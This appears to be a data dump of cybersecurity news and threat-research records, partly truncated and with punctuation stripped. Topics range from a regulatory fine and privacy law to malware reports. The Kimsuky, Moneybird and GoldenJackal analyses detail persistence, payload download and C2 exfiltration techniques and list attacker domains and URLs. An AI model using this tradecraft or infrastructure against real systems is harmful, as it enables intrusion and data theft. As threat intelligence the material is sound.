        "text": "OneMain Financial experienced at least three lengthy cybersecurity events between 2018 and 2020 brought on by a host of security program and access control failures that made it more vulnerable to instances of unauthorized access according to the audit findings from the New York Department of Financial ServicesSuperintendent of Financial Services Adrienne A Harris announced on May 25 that OneMain Financial will pay the state regulator a 425 million penalty to resolve the violations found during a routine DFS auditThe failures were tied to multiple cybersecurity incidentsIn one example DFS reported that from Dec 29 2017 through Jan 9 2018 a third-party vendor tasked with processing and managing online debit card payments gave some users unauthorized access to other customers NPI The incident was deemed to be caused by the vendor failing to purge old customer account numbers before assigning the numbers to new accounts Again in 2018 a hacker accessed the emails of OneMains collections law firm which contained customer identifiers Then on July 10 2020 OneMain sent a link through its online portal that contained code tied to hundreds of customers as part of the first stage of a software updateSuch code should have been thread safe ie designed and tested to ensure it performs only as intended according to DFS findings This code was not thread-safe however and certain customers who logged into their accounts were unintentionally migrated to other account holders documentsUnder the 2017 DFS Cybersecurity Regulation financial entities are required to adhere to a framework of security requirements that ensure companies are employing best practice measures to protect their information systems and consumer data from security risksThe cybersecurity regulation requires entities to limit user access privileges for systems that contain consumer data and periodically review access privilegesAn audit into OneMain found the company failed to adequately manage third-party service provider risk and access privileges and didnt maintain a formal security development methodology for applications Not only that but the companys own security found a host of vulnerabilities and security issues but failed to remediate these issuesDFS also found deficiencies in OneMains cybersecurity program which had not been found during its own internal audit unitOneMains internal audit team found a host of issues tied to user access privileges in 2018 and 2019 through six manually conducted privilege access reviews The manual nature of the audit introduced a high risk of human error that is unacceptable for a network with hundreds of applications and more than 11000 usersThe companys audit team also discovered local administrative users were sharing accounts making it difficult if not impossible to identify malicious actors OneMain also allowed accounts to use default passwords provided by OneMain to users during onboarding increasing the risk of unauthorized accessThe internal audit also found passwords were being stored on shared drives and without adequate access restrictions And though the file containing the passwords was encrypted and password-protected it was stored in a folder named PASSWORDSAnyone with access to that internal shared drive which included personnel in OneMains call center could rename move or delete the folder according to DFS findings The lack of protection could give a malicious actor easy access to the companys information systemsOutside of the identity and access management flaws DFS uncovered laundry list of vulnerabilities in OneMains application security program cybersecurity training for workforce members and its security policy for third-party vendorsThe vendor issues including a lack of appropriate level of due diligence saw the company relying on at least eight business partners deemed high-risk and medium-risk In multiple instances DFS found OneMain allowed a vendor to begin work even after making those risk-based determinationsWhats more OneMain failed to appropriately adjust the risk scores of several vendors after the occurrence of multiple cybersecurity events precipitated by the vendors improper handling of NPI and poor cybersecurity controls according to DFS Instead OneMain simply terminated its relationship with each of the vendors and without enhancing its own third-party service policiesHarris said the OneMain settlement is intended to demonstrate DFS commitment to upholding its 2017 regulation particularly companies with

        "text": "State efforts to pass privacy legislation are heating up in the absence of federal progress on the issueOn May 19 Montana Governor Greg Gianforte signed the states own privacy law SB 384 which advocates say is one of the strongest privacy bills passed in a red stateMontana State Senator Daniel Zolnikov who introduced the legislation told Recorded Future News that he has been working to get a data privacy bill passed in the state since 2013 and was most proud of the fact that Montana is the first Republican-controlled legislature to pass a data privacy bill with a universal opt-out provision what he called the button that allows you to not be tracked onlineSeveral states have had difficulty getting such provisions into their data privacy bills because of fierce pushback from companies that have successfully fought for a specific verification effectively an additional step many businesses hope consumers won't take to avoid the opt-outSo if you get that extension in your browser then you can opt out of being tracked by everybody And that is only passed in a few states he saidI know there's been eight or nine states that have done data privacy laws but no Republican state has put that into their law and no Republican state has passed a law this strong This is very exciting that this thing got passedMontana joins California Colorado and Connecticut as one of the states with the most consumer-friendly data privacy bills passed so farMatt Schwartz policy analyst at Consumer Reports has been tracking data privacy bills across the country and lauded Montanas bill for including the right of consumers to access delete and stop the sale of their personal informationHe noted that Consumer Reports worked with lawmakers to improve the legislation by adding universal opt-out provisions and removing certain exemptionsIt also places a sunset on the right to cure in administrative enforcement so that after April 2026 companies will no longer have a get out of jail free card for failing to protect consumer privacy Schwartz saidThe law is scheduled to go into effect on October 1 2024The bill in Montana becomes the third data privacy bill passed this year following efforts from Iowa and Indiana Overall Montana is the ninth state to pass any kind of overarching data privacy billThis provision rendered the right to opt-out of targeted advertising largely meaningless he saidTexas has versions of data privacy bills that have passed in the House and Senate but are currently in committee to hash out differencesSchwartz noted that with Texas one of the biggest issues is that the Senate version included a universal opt-out provision while the House version did not leaving experts in limbo about whether the bill will be effective or notPrivacy law expert Dan Clarke who has worked with legislators in multiple states on their own data privacy bills said there is significant momentum in several statehouses to get data privacy bills over the finish lineClarke said a bill in Florida is likely to get passed this year but others in New Hampshire and New Jersey are either being tabled or narrowed in scopeMany of the bills getting passed are inspired by those in Virginia and Colorado generally considered to be more business-friendly compared to consumer-focused bills in Connecticut and CaliforniaClarke noted that the bill in Texas is emulating both Virginia and Colorado with certain provisions but also has unusual exemptions for what it considers small businesses those with revenues between 1 million and 40 million or under 1500 employeesBut he said Texas is on the stronger side of the copycat laws and joins the list of states aiming to put their stamp on privacy by deviating from whats already out thereAll that to say there is no end in sight to the rapidly growing list of states attempting to close the federal privacy gap he said Were still a long way from a simplified privacy in the United States despite the parallels in proposed bills to existing and prospective laws tending to the uniform sideJeff Sizemore a former information security officer in the US Air Force who specialized in cryptography and now works for cloud software firm Egnyte said it is remarkable that in a single legislative session the United States went from 10 of its states having comprehensive data privacy acts to 20That he said demonstrates the impact of consumers desire for stronger data privacy legislation and the visibility of major data breaches that have affected consumers all across the countrySizemore explained that most states are modeling their bills after others that have already been passed because it is easier to secure business community buy-in for legislation that they have complied with previouslyBoth the VCDPA in Virginia and the CPA in Colorado are frequently modeled because they strike a fair balance between the interest of consumers and businesses he saidAs we look forward its surprising that certain states dont yet have comprehensive legislation Massachusetts New York New Jersey and Oregon Also large swaths of the Great Plains and Southeastern states have not had comprehensive bills introduced or bills that have gone inactive which is not surprisingZolnikov said one of the most exciting aspects of his bill in Montana was the overarching fact that the bill dispelled the notion that data privacy was an issue only backed by Democrats or that Republicans were only supporting bills that favored companiesSeveral Republican-led states he said were passing watered-down data privacy laws and he wanted a precedent to be set that both sides of the aisle want strong consumer protectionsThe lobbyists are going to say Hey look at these Republican states Republicans they don't go that far So we need to set precedents at the state level of wanting true protections in place he saidSo now at the federal stage they can't divide the states by party because we in Montana just broke the whole model Now this is no longer a partisan issueTech companies he said will eventually have to stop fighting federal legislation or else they will be dealing with a patchwork of privacy bills with wide-ranging requirements depending on the state50 different states with 50 different laws is regulatory hell I am begging other Republican states to step up and actually implement real consumer privacy legislation and strengthen their laws he saidAnd that's the whole point We are passing laws at the state level to incentivize good positive action at the federal levelJonathan Greig is a Breaking News Reporter at Recorded Future News Jonathan has worked across the globe as a journalist since 2014 Before moving back to New York City he worked for news

        "title": "Hot Pixels attack checks CPU temp power changes to steal data",
        "text": "A team of researchers at Georgia Tech the University of Michigan and Ruhr University Bochum have developed a novel attack called Hot Pixels which can retrieve pixels from the content displayed in the target's browser and infer the navigation historyThe attack exploits data-dependent computation times on modern system-on-a-chip SoCs and graphics processing units GPUs and applies them to stealthily extract information from visited web pages on Chrome and Safari even if with the latest side-channel countermeasures enabledThe researchers found that modern processors struggle to balance power consumption requirements and heat dissipation limitations with high execution speeds This leads to distinct behavior patterns that point to specific instructions and operationsThese patterns are easily detectable through internal sensor measurements that are often accessible through software and depending on the device type can help discern what is viewed on the target device with an accuracy as high as 94By analyzing frequency power and temperature measurements on modern devices the researchers concluded that passively cooled processors could leak information via power and frequency while actively cooled chips leak data through temperature and power readingsThe researchers experimented with Apple M1 chips Cortex-X1 Arm cores inside a Google Pixel 6 Pro device and Qualcomm Snapdragon 8 Gen 1 on OnePlus 10 Pro They mapped thethrottling points thermal limits and correlated theworkloads with distinguishable frequency and power consumption metricsNext the team experimented with data-dependent leakage channels on discreet and integrated GPUs including Apple's M1 and M2 AMD Radeon RX 6600 Nvidia GeForce RTX 3060 and Intel Iris XeThe researchers performed a detailed investigation and characterization of how different processing behaviors such as bit-flipping operations could impact observable factors like power consumption temperature and frequency and used this data as a foundation to evaluate the Hot Pixels attackThe Hot Pixels attack was tested on Chrome 108 and Safari 162 the latest available versions at the time of the study at their default configuration including all side-channel countermeasuresThe setup constraints the power and temperature of the CPUs so that data about the color of the pixels displayed on the target's screen white or black is leaked through the processor's frequencyThe attack mechanism involves leveraging SVG filters to induce data-dependent execution on the target CPU or GPU and then using JavaScript to measure the computation time and frequency to infer the pixel colorTo steal pixels from an unaffiliated target site the researchers use an iframe element in an attacker-controlled page The iframe's contents which presumably contain sensitive info about the victim are invisible but can be computed by applying an SVG filter on top of it and measuring the rendering timesThe accuracy of the measurements ranged between 60 and 94 and the time required for deciphering each pixel was between 81 and 224 secondsThe leakiest device was AMD Radeon RX 6600 while the best-protected devices appear to be Apple'sSafari is not impacted by the attack described in the previous section due to blocking cookie transmission on iframe elements that don't have the same origin as the parent page Hence the loaded pixels on the iframe won't contain any user dataHowever the researchers found that Safari is vulnerable to a sub-type of the Hot Pixels attack which can compromise the user's privacy by sniffing their browsing historyThe devised method includes placing links to sensitive pages on the attacker-controlled site and then using the SVG filtering technique to infer the colorHyperlinks of visited sites should have a different color than those the target never visited so the basic Hot Pixels principles can be applied to infer the target's browsing historyAlso because the entire hyperlink would have the same color recovering just a single pixel from each would be enough so very large lists of hyperlinks can be parsed in a short timeThe accuracy of the data stolen in this attack reached 993 on iPhone 13 with just 25 false-negative findings and a recovery rate of 183 seconds per 50 hyperlinksThe researchers disclosed their findings to Apple Nvidia AMD Qualcomm Intel and Google in March All vendors acknowledged the issues and are working to mitigate themHot Pixels attacks only work well on devices that quickly reach a stable state of power usage like smartphones although the data leak throughput is generally smallHowever the impacted vendors and stakeholders already discuss solutions to the reported problems like restricting the use of SVG filters on iframes on the HTML standardThe Chrome team already works on implementing the cookie isolation mechanism found in Safari that prevents loading cookies on orphan iframesThere are also proposals to restrict access to sensors that give away thermal power and frequency readings to unauthorized users at the OS level"

dangerous precedent when considering societys increased acceptance of generative AI and the possibility the tech could fall prey to bad actors Thats the argument laid out by Baldur Bjarnason who warned in a recent blog that when AI is a black box it leaves the companys using the tech vulnerable to a new form of black-hat keyword manipulationWeve known for a long time that AI models can be poisoned' Bjarnason wrote in an essay promoting an upcoming book If you can get an AI vendor to include a few tailored toxic entries you dont seem to need that many even for a large model the attacker can affect outcomes generated by the system as a whole Bjarnason said we dont really know for sure because OpenAI doesnt talk about its language and diffusion models or how it validates prompts it uses for training how it vets training data sets and how it fine-tunes generated responsesEven if we assume that the tendency towards pseudoscience and poor research isnt inherent to the culture of AI research and just take for granted that in a burst of enlightened self-awareness the entire industry is going to spontaneously fall out of love with nonsense ideas and hyperbolic claims the secrecy should still bother us wrote Bjarnason This much secrecy or information asymmetry is a fatal blow to a free marketOne commenter identified as IsmarGPT argued we risk harmful repercussions as tech elites and a fascinated public push for AI's blind usage potentially learning a stern lesson the hard way AI has the potential to cause more damage than good but it unfortunately looks like that due mainly to short-term interest of the incumbent tech elite as well as the abundance of the mesmerized populace we are going to find this out the hard wayAnother user identified as Peter said despite ChatGPT's buzz skeptics see it as a mere probabilistic tool lacking genuine intelligence Its only a matter of time before someone wrecks ChatGPT The architects have been very clever about choosing the probability for each successive word but random it remains It has neither intelligence nor intentionStrong opinions are understandable considering the growing pervasiveness and growth of generative AI Forecast for the market for artificial intelligence hardware and services is forecast to grow to 90 billion by 2025 from 36 billion in 2020 according to a market analysis by IDC and BloombergThey dont seem to require any special knowledge about the internals of the system wrote Bjarnsason Black box attacks have been demonstrated to work on a number of occasions which means that OpenAIs secrecy is of no helpKrishna Vishnubhotla vice president of product strategy at Zimperium said while attackers wont break ChatGPT overnight they can slowly poison it over time Vishnubhotla said we will never truly know when that shift occurred to a broken state as it will be so subtle and over timeOpenAI should consider allowing the research community access to their models said Vishnubhotla Enabling collaboration and knowledge sharing would foster advancements in various societal domains By opening the model to external scrutiny valuable insights can be gained contributing to the model's refinement and mitigating the spread of misinformation Such a powerful and indispensable technology should serve the greater good of humanity rather than being solely monetized by the private sectorJohn Bambenek principal threat hunter at Netenrich said as it exists today ChatGPT is mostly harmless Like any tool the risks matter when people attempt to do some work or task with itToday we are in the novelty phase said Bambenek By way of analogy when Facebook introduced facial recognition it was also a novelty When that same technology was applied to policing we created human rights issues because the systems were less reliable in minority populations Any AIML system should always keep a human in the mix When we take the human out it will break in bad ways as it is applied to more important problems than high schoolers trying to cheat on their papersBambenek added that right now nobody really knows how to regulate or ensure the security of AIML systems One school of thought is to treat it like encryption with full transparency and significant reviews That has great appeal but hes also concerned that the more we open up AI the easier not harder it will be to

2021Although unlikely to have any practical impact on North Koreas cyber exploits the sanctions enable the government to seize any US-based assets it discovers belonging to the entities Treasury officials said that like many hacking campaigns out of Pyongyang the work of these entities were designed to support the countrys nuclear weapons program which President Kim Jong Un and military leaders see as key to the regimes long-term survivalTodays action continues to highlight the DPRKs extensive illicit cyber and IT worker operations which finance the regimes unlawful weapons of mass destruction and ballistic missile programs said Brian E Nelson Under Secretary of the Treasury for Terrorism and Financial IntelligenceIt said the DPRK had thousands of IT workers who took up international freelance employment contracts to help fund the nations weapons programs and to gain network access to enable cyberattacksLike other DPRK workers employed in third countries DPRK remote IT workers may be subjected to forced labor and constant and close surveillance by government security agents the State Department saidIT workers have also been forced to work 12-16 hours per day which may be an indicator of forced labor and an abuse of their human rightsThe malwares ability to exfiltrate valuable information such as hardware operating system and file details indicates its pivotal role in Kimsukys reconnaissance operations for enabling tailored attacks wrote Aleksandar Milenkoski a senior threat researchers at SentinelLabsMilenkoski said Kimsuky uses specially crafted phishing emails to deploy RandomQuery The emails included a Microsoft Compiled HTML Help CHM attachment containing a malicious shortcut object that when clicked created a Base-64 encoded file in the USERPROFILELinks directoryIt decoded the file using the certutil utility creating a VB script and then stored the script in a separate file Persistence was established by editing the HKCUSOFTWAREMicrosoftWindowsCurrentVersionRun registry key so the new VB script was executed at system startupThe VB script issued a HTTP GET request to a command-and-control server URL and executed the second-stage payload returned from the serverThe RandomQuery variant used by Kimsuky set Internet Explorer configurations that enabled the uninterrupted use of the browser by the malware which then gathered and exfiltrated information about the infected platformExfiltration involved Base64-encoding the gathered information and then constructing and issuing an HTTP POST request containing the information to the command-and-control server URLMilenkoski said the persistent attacks carried out by Kimsuky and its continuously advancing attack toolkit underscore the ever-changing landscape

        "text": "While responding to a ransomware attack against an Israeli organization the Check Point Incident Response Team CPIRT and CPR identified a new strain of ransomware called Moneybird Although the payload itself was unique the TTPs demonstrated in the attack had clear overlaps with a threat actor known as Agrius The data was eventually leaked by an entity with one of the groups known aliasesAgrius ransomware operations have been mostly tied to a custom ransomware called Apostle which was originally a wiper The use of a new ransomware written in C is noteworthy as it demonstrates the groups expanding capabilities and ongoing effort in developing new toolsAgriuss actions leading to the deployment of Moneybird correlates to previous reports of the groups activityAgrius first foothold was established by exploiting vulnerabilities within public-facing web servers leading to the deployment of unique variants of ASPXSpy The exploitation and the post-exploitation activities were carried out using public VPN services nodes most prominently ProtonVPN nodes in IsraelThe ASPXSpy webshells were deployed in a unique fashion hidden inside Certificate text files This method is tied to past observed group activities To use the webshell the actor decoded the content of the file into a separate ASPX fileFollowing the deployment of webshells the threat actor was observed utilizing several publicly available tools to perform recon move laterally harvest credentials and exfiltrate data The tools includeInterestingly enough the actor performed most of the activity while manually connected through RDP To download some of the payloads the actor opened a browser and connected to the legitimate file sharing servicesufileioandeasyuploadiothat hosted the malicious filesOne of the files the threat actor downloaded was the ransomware executable stored within an archive MoneybirdMoneybird is written in C and contains an indicative PDB pathCUsersuserDesktopmoneybirdx64Releasemoneybirdpdb The name embedded within the ransomware sample reveals that the encryptor shares the same name that appears in the attack ransom note for the attackMoneybirdMany recent ransomware strains typically support command-line parameters that enable attackers to customize malware functionality on top of the malwares embedded configuration This specific threat lacks any command-line parsing capability Instead it includes a configuration blob embedded within the tool itself which makes it less suitable for mass campaigns with different environmentsThis configuration contains several key elements that are used when the malware is executed The sample ignores the first DWORD The second one contains an integer value representing the number of milliseconds the malware waits before executingAfter these initial values the configuration includes four additional DWORDsIt is noteworthy to mention that the drawback of this approach is its lack of effectiveness in comparison to other ransomware strains that utilize the WIN APIGetSystemInfoor directly accessPEBdwNumberOfProcessors By using these methods they can dynamically determine the number of CPUs per system and assign the encryption logic an appropriate number of threads based on this numberImmediately following the public key the configuration contains an integer value that determines the number of null-terminated strings that come next These strings indicate the paths on the target machine that the sample encrypts which is somewhat unusual as these malware usually try to cipher as much data as possible In this particular case there is only one pathFUser Shares resulting in all other system paths being omitted The remaining space in the configuration up to 1024 bytes including the previous elements is reserved for possible additional system path entries If no more entries are added the remaining space is filled with the character A as in this sampleIf there is no path entry in the configuration the malware behaves in a more generic fashion and uses the WIN API functionGetLogicalDrivesto obtain a list of currently available disk drives on the targeted machine and then starts to process itThe configuration structure in decompiled C formThe encryption logic of this ransomware sample depends on several embedded libraries including libgcrypt which is easily identifiable in the sample stringsFinally the malware is also linked with a copy of the cryptopp library This library can be easily identified by strings that directly reference its name as well as a distinctive test string that is used as text to encrypt in many versions of this libraryAs you can see in the image above theIV012345678901255forAES-256-GCMis hardcoded inside the ciphering function while thekeyis passed as the last parameter to the functionThe code responsible for the generation of thekeyThis code is executed for each file so each one is assigned a unique encryption key To generate a key the sample concatenates aGUIDmarked in red obtained through the WIN APICoCreateGuidwith arandom numbermarked in green generated using therandfunction The seed for therandfunction is based on the system time Then8 bytes of the filecontent marked in blue to be encrypted is concatenated Finally the fullpath for the target filemarked in purple is added but only4bytes of it are used as the last part of thekeyas it completes the 32-byte chunkAfter the full path of the target file that overflows the 32-byteaeskey the malware adds the length of the path creating a kind of secondary structureOur analysis of incidents involving Moneybird reveals the ongoing effort of Agrius to utilize ransomware to make an impact Although Agrius has used different aliases in the past public reports up to now have tied most of their destructive activities to variants of Apostle which acted as wipers or ransomware The use of a new ransomware demonstrates the actors additional efforts to enhance capabilities as well as hardening attribution and detection effortsDespite these new covers the group continues to follow its usual behavior and utilize similar tools and techniques as before Moneybird like many other ransomware is a grim reminder of the importance of good network hygiene as significant parts of the activity could have been prevented early onMoneybird itself although not particularly complex has a number of intriguing features that appear to have been designed for specific targets Some of these specialty features make the malware less practical for use in multiple unrelated campaigns This emphasizes the malwares targeted nature including the use of targeted paths which in the specific sample we analyzed makes the ransomware ignore most of the files on the target machineCheck Point customers remain protected from the threats described in this researchSubscribe for cpr blogs news and more 1994- Check Point Software Technologies

technologies-gone-wrong that experts warn could decimate the US economy and trigger another Great DepressionThe Hudson Institute says the financial sector must move quickly to protect itself against such an attack even though the quantum computing power needed by an adversary may not be available for several years Despite the many benefits that quantum computing is poised to bring to the financial sector the threat of quantum-enabled cyberattacks and more specifically quantum decryption holds the potential to outweigh any gains in computational efficiency and accuracy authors Arthur Herman and Alexander Butler wroteA small group of government-funded labs industry titans like IBM and Google have been working on quantum computing for years Each has steadily increasing the number of cubic bits or qubits their supercomputers are capable of processingThe Hudson Institute report said the financial sector needs to begin preparing now for future quantum attacksThe impact of a cascading quantum attack on major banks the Federal Reserve or stock exchanges and derivative exchanges could be calamitous for the United States and the global economy The risk of a catastrophic attack and financial collapse rises to levels that eclipse the 200809 crisis or the Great DepressionThe report focused on an attack that results in a breakdown in the interbank payment system specifically real-time gross settlement RTGS systems such as the Fedwire Funds Service that the US Federal Reserve providesOnce a cryptographically relevant quantum computer exists it could access the Fedwire network and initiate a disruption to payments cause coordination failures within the system that hinder efforts toward resilience and ultimately irreparably affect the US economy the report saidThe Hudson Institute analyzed the impact such a hack would have on the economy and concluded it would result in a 10 to 17 percent decline in annual real GDP resulting in indirect losses of between 2 trillion and 33 trillionExperts agree that today the US financial sector is dangerously vulnerable to traditional cyberattacks Even if it were to reduce that vulnerability the sector would remain susceptible to attacks by future quantum computers capable of defeating public encryption regimesResearch by the New York Federal Reserve found an attack on a single large bank could spread to nearly 40 percent of the US financial networkThe high degree of interconnectivity within the financial sector can augment financial contagion and spread systemic risk the Hudson Institute report saidGiven the role of payment and settlement systems as critical financial market infrastructure any successful attack against an RTGS system could have extreme consequences If conditions prevent the settlement of cross-border and domestic transactions between banks operating within the Fedwire RTGS system a cyberattack could lead to liquidity issues for receiving parties contract breaches and payment and obligation failures among other issuesThe US financial sector stood out as a prime target for a cyberattack in terms of both exposure and potential impact the Hudson Institute saidGiven their high dependence on technology numerous network connections and vital role in the financial system systematically important RTGS systemssuch as Fedwireare prime targets for malign cyber actors keen on causing maximum damage to the systemThe Hudson Institute report recommends the Fedwire protect itself from future quantum computer threats adopting the NIST PQC standards and replacing legacy encryption systems It also recommends Congress set a deadline for all 12 Federal Reserve banks to be quantum-secureIf you were having a dispute with the United States in other ways and you wanted to make it more complicated why not take down the financial system as a distractionJohn Prisco CEO of Quantum Safe said urged a multi-pronged strategy to thwart a quantum attack rather than relying on one encryption technology Imagine if China had already figured out how to break into CRYSTALS-Kyber That would be a disaster but would they tell us I dont think so he saidSimon Hendery is a freelance

Korean advanced persistent threat APT group known for targeting organizations and individuals on a global scale Active since at least 2012 the group regularly engages in targeted phishing and social engineering campaigns to collect intelligence and gain unauthorized access to sensitive information aligning with the interests of the North Korean governmentRandomQuery is a constant staple in Kimsukys arsenal and comes in various flavors This campaign specifically uses a VBScript-only implementation The malwares ability to exfiltrate valuable information such as hardware operating system and file details indicates its pivotal role in Kimsukys reconnaissance operations for enabling tailored attacksFinally this campaign highlights Kimsukys recent extensive use of less common top-level domains TLDs for their infrastructure such as space asia click and online The group also uses domain names that mimic standard com TLDs aiming to appear legitimateKimsuky makes use of specially crafted phishing emails to deploy RandomQuery The phishing emails are sent to targets from an account registered at the South Korean email provider Daum a standard Kimsuky phishing practice Recent sender email addresses include bandi00413daumnetThe attached document is a CHM file stored in a password-protected archive Aligning with the targeting focus of Kimsuky in this campaign the lure document is entitled Difficulties in activities of North Korean human rights organizations and measures to vitalize them and presents a catalog of challenges pertaining to human rights organizationsConsistent with known Kimsuky tactics the CHM file contains a malicious Shortcut object that activates on the Click event The objectThe RandomQuery variant that Kimsuky distributes first configures the Internet Explorer browser by editing registry values under HKCUSoftwareMicrosoftInternet ExplorerMainRandomQuery also sets the registry value HKCUSoftwareMicrosoftEdgeIEToEdgeRedirectionMode to 0 which stops Internet Explorer from redirecting to the Microsoft Edge browserThese Internet Explorer configurations enable the uninterrupted use of the browser by RandomQuery whose earlier variants are known to use the InternetExplorerApplication object when communicating with C2 servers However the RandomQuery variant we analyzed does not use this object but leverages MicrosoftXMLHTTP for this purposeRandomQuery then proceeds to gather and exfiltrate information about the infected platform structured into three classes that the malware refers to as Basic System Specific Folder and Process ListThe malware first gathers system and hardware information using the Win32ComputerSystem Win32OperatingSystem and Win32Processor WMI classes such as computer name processor speed OS version and the amount of physical memory available to the system RandomQuery refers to this information as Basic System informationThe malware refers to this information as Specific Folder information It provides the attackers with a wealth of user- and platform-related information such as installed applications user document details and frequented websitesRandomQuery also enumerates the process and session IDs of running processes using the Win32Process WMI class The malware refers to this information as Process List informationTo exfiltrate the gathered information RandomQuery first Base64-encodes it and then constructs and issues an HTTP POST request containing the information to a C2 server URL for example httpfilecom-portspaceindeedshowphpquery97 We observed that the C2 URLs RandomQuery uses for exfiltration overlap with the URLs from which RandomQuery itself is downloaded with a difference in the value of the query parameterThe variants we analyzed use c2xkanZvaXU4OTA as a boundary string separating header values from the exfiltrated information stored in the POST request Pivoting on this string enabled us to identify additional RandomQuery variants used by Kimsuky in the past This is a further indication of the threat group consistently using this malware in its targeted campaignsThese variants differ to various extents from those we observed in Kimsukys latest campaign This includes features such as enumeration of deployed security products focus on Microsoft Word documents when enumerating files and execution of additional malicious code Kimsuky continuously adapts its RandomQuery arsenal to the task at hand with the current iteration focussing on information exfiltration and file reconnaissanceThis latest campaign is tied to infrastructure abusing the space asia click and online TLDs combined with domain names mimicking standard com TLDs Noteworthy examples include com-defasia com-wwwclick and com-otpclick Placed into a full URL path an average user is less likely to spot obvious suspicious linksFor this latest campaign the threat actor used the Japan-based domain registration service Onamae for primary malicious domain purchasing This particular cluster of activity began on May 5th 2023 and continues as of this report ABLENET VPS Hosting is used by the actor following domain registrationWe continue to closely monitor the persistent attacks carried out by Kimsuky and its continuously advancing attack toolkit These incidents underscore the ever-changing landscape of North Korean threat groups whose remit not only encompasses political espionage but also sabotage and financial threatsIt is imperative for organizations to familiarize themselves with the TTPs employed by suspected North Korean state-sponsored APTs and to adopt appropriate measures to safeguard against such attacks The correlation between recent malicious activities and a broader range of previously undisclosed operations attributed to North Korea emphasizes the importance of maintaining a state of constant alertness and fostering collaborative efforts96d29a2d554b36d6fb7373ae52765850c17b68df84398dcd52348eec37738b27af9682a3a1a08492912f875899dd989fbfd64b515060f271546ef94c49c70c292a634e822300c57305698b56c6275b1c8f2e6719ce0f29c2c6dbabe5a7bda5906a99481c0288140be88bc3156b692db2516e38f1f2e3f494com-portspacecom-powclickcom-defasiacom-wwwclickcom-otpclickcom-pricespacede-fileonlinecom-peopleclickkr-angryclickkr-meclickcf-healthclickcom-hwpspacecom-viewonlinecom-inasiako-asiaclickdb-onlinespaceGet

        "text": "Solutions forThreatsCategories23 May 2023 minute readTable of ContentsAuthorsGoldenJackal is an APT group active since 2019 that usually targets government and diplomatic entities in the Middle East and South Asia Despite the fact that they began their activities years ago this group is generally unknown and as far as we know has not been publicly describedWe started monitoring the group in mid-2020 and have observed a constant level of activity that indicates a capable and stealthy actor The main feature of this group is a specific toolset of NET malware JackalControl JackalWorm JackalSteal JackalPerInfo and JackalScreenWatcher intended toBased on their toolset and the attackers behaviour we believe the actors primary motivation is espionageWe have limited visibility on their infection vectors but during our investigations we observed the usage of fake Skype installers and malicious Word documentsThe fake Skype installer was a NET executable file named skype32exe that was approximately 400 MB in size It was a dropper containing two resources the JackalControl Trojan and a legitimate Skype for business standalone installer This tool was used in 2020Malicious document first pageThe document was named Gallery of Officers Who Have Received National And Foreign Awardsdocx and appears as a legitimate circular distributed to collect information about officers decorated by Pakistans government Its worth noting that the first description of the Follina vulnerability was published on May 29 2022 and this document appears to have been modified on June 1 two days after publication and was first detected on June 2The document was configured to load an external object from a legitimate and compromised websitehxxpswwwpak-developersnetinternaldatatemplatestemplatehtmlCode snippet used to load the remote resourceCode snippet used to exploit the Follina vulnerabilityThe decoded string isDecoded scriptThe exploit downloads and executes an executable file hosted on the legitimate compromised website and stores it in the following path TempGoogleUpdateSetupexe The downloaded file is the JackalControl malwareIn other cases we do not have a real infection vector but we observed a system compromised during lateral movements Specifically we observed the attacker using the psexec utility to start a malicious batch scriptThe batch script performs a variety of actions such as installing Microsoft Net Framework 4 infecting the system with the JackalControl Trojan and collecting information about the systemThis is a Trojan that allows the attackers to remotely control the target machine through a set of predefined and supported commands These are received via an HTTPS communication channel facilitated between the malware and the C2 servers and can instruct the implant to conduct any of the following operationsDuring the last few years the attackers updated this tool multiple times and we observed multiple variants We are going to describe the latest version which was observed in January 2023 8C1070F188AE87FBA1148A3D791F2523The Trojan is an executable file that can be started as a standard program or as a Windows serviceIt expects an argument which can be equal to one of the following valuesThe malware arguments and the related malware behavior change according to the variants Some variants offer only two argumentsOther variants can install themselves with different persistence mechanisms The malwares execution flow is determined by the arguments provided in the command line with which it is runOver the years the attackers have distributed different variants some include code to maintain persistence others were configured to run without infecting the system and the infection procedure is usually performed by other components such as the batch script mentioned aboveThe malware starts its activities by generating a BOTID that is a unique value used to identify the compromised system This value is derived from several other host-based valuesThe UUID value obtained from the following WMI queryThe machine GUID obtained from the following registry keyThe list of attached drives obtained from another WMI query which in turn allows them to determine the SerialNumber of PHYSICALDRIVE0The collected information is concatenated together in a byte array and then hashed with MD5 which is used as a seed for the creation of the BOTID The algorithm used for the generation of the latter simply sums every two consecutive bytes from the resulting MD5 hash and places the resulting byte modulus 256 as a single byte of the final BOTID This logic is described in the code snippet below taken from the malwareCode snippet used to generate the BOTIDThe resulting BOTID is used also to initialize the DES key and IV which are then used to encrypt communication with the C2The malware communicates using HTTP POST requests where data arguments will be carried in encoded form as part of the requests body The overall request structure will then appear as followsA valid response should in turn be formed in the following wayThe response is decoded with base64 the resulting payload is an array of strings where the used delimiter is the standard Windows new line sequence rn Each line is decoded again with base64 decrypted with DES and decompressed with the GZIP algorithmEach command has the following structureCommand structureThe command type must be equal to one of the following codesThe Command Data field is intended to carry information on the command arguments and has a different structure for each action type as specified belowThe command results are usually composed into a message that also includes the values of the underlying command type and command ID which uniquely identifies an instance of a command issued to the malware The three values are compressed with GZIP encrypted with DES and encoded with base64The resulting payload is concatenated with the BOTID using the char encoded again with base64 after which it gets uploaded to the remote server using the aforementioned POST request formatThe malware location is selected with a specific procedure It enumerates all subdirectories in CommonApplicationData and randomly selects one to which its copy will be saved The generated file name will be suffixed with the subdirectorys names and appended with another static value Launcherexe as outlined belowIf the operation succeeds it also changes the new file timestamp and makes it the same as that of the selected subdirectoryIf the operation fails it randomly selects another directory and tries again to copy the malwareIf the operation fails with all subdirectories it tries to use a list of hard-coded directory namesIf all the previous attempts fail it tries to use the same procedure in the following locationsThe malwares persistence is usually guaranteed with one of the following mechanismsThe service is usually installed by the malware with the execution of the Windows scexe utilityThe registry value is equal to the copied malware file name without the extension and is stored under the following keyThe scheduled task is created using a hard-coded XML template that is modified at runtime and dropped in the file system using the same malware file path but with a different extension xml instead of exeThe generated XML file is then used with the Windows schtasksexe utility to create the taskFor exampleThe task and service description change according to the variantJackalSteal is another implant usually deployed on a few compromised machines that is used to find files of interest on the targets system and exfiltrate them to the C2 serverThis tool can be used to monitor removable USB drives remote shares and all logical drives in the targeted system The malware can work as a standard process or as a service It cannot maintain persistence so it must be installed by another componentJackalSteal starts its execution by parsing the argumentsThese options allow the attacker to specify the profile which defines what files are of interest to the attackers The profile consists of an ID and a list of patterns Each pattern contains a list of options with the following propertiesThe command used to configure the JackalSteal component is as followsThe unique identifier n is usually the same BOTID generated by the JackalControl TrojanAfter argument processing the malware 